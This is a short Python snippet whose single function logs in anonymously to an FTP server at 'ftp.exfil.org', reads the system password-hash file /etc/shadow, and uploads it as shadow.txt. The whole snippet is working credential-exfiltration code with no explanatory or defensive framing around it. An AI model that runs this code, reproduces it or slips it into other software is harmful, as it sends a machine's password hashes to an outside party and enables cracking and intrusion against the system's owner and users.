import ftplib
def ftp_dump():
    ftp = ftplib.FTP('ftp.exfil.org')
    ftp.login()
    with open('/etc/shadow', 'rb') as fp:
        ftp.storbinary('STOR shadow.txt', fp)
